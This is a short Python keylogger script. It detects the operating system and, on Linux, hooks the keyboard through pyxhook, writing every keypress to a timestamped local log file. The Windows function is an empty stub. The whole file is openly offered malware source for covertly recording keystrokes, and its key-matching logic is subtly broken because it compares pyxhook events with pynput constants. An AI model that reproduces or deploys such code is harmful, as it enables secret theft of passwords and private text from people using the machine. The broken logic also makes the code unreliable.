#!/usr/bin/python

import os
from pynput import keyboard
from datetime import datetime
import pyxhook
import platform

# Function for Linux-based OS keylogger
def linuxKeylogger():
    # Create log file
    log = f"{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log"

    def onPress(event):

        # Open log file and append key presses
        with open(log, "a") as f:
            # If 'Enter' key is pressed, replace with newline
            # Use match case for special characters, maybe
            match event:
                #case keyboard.Key.enter: f.write('\n')
                # Backspaces aren't processed correctly
                case keyboard.Key.backspace: f.write('[backspace]')
                case keyboard.Key.ctrl_l | keyboard.Key.ctrl_r: pass
                case keyboard.Key.shift_l | keyboard.Key.shift_r: pass
                case _: f.write(f"{chr(event.Ascii)}") # Append key presses to file and convert ascii to readable characters

    # Create hookmanager
    hook = pyxhook.HookManager()

    # Define callback to fire when a key is pressed
    hook.KeyDown = onPress

    # Hook the keyboard
    hook.HookKeyboard()

    try:
        hook.start()
    except KeyboardInterrupt:
        # Exit program
        hook.cancel()
        pass
    except Exception as ex:
        exit()
        #msg = f"Error while catching events:\n {ex}"
        #pyxhook.print_err(msg)
        #with open(log, "a") as f:
        #    f.write(f"\n{msg}")

# Function for Windows-based OS keylogger
def winKeylogger():
     
    print("Run Windows keylogger...")


def main():
    # Determine the OS running and print it
    OS = platform.system()
    print(f"{OS}")

    # Match case to run OS-dependant function
    match OS:
        case "Linux": linuxKeylogger() # Call Linux-based keylogger
        case "Windows": winKeylogger() # Call Windows-based keylogger
        case _: print("OS is not 'Windows' or 'Linux'.")

if __name__ == "__main__":
    main()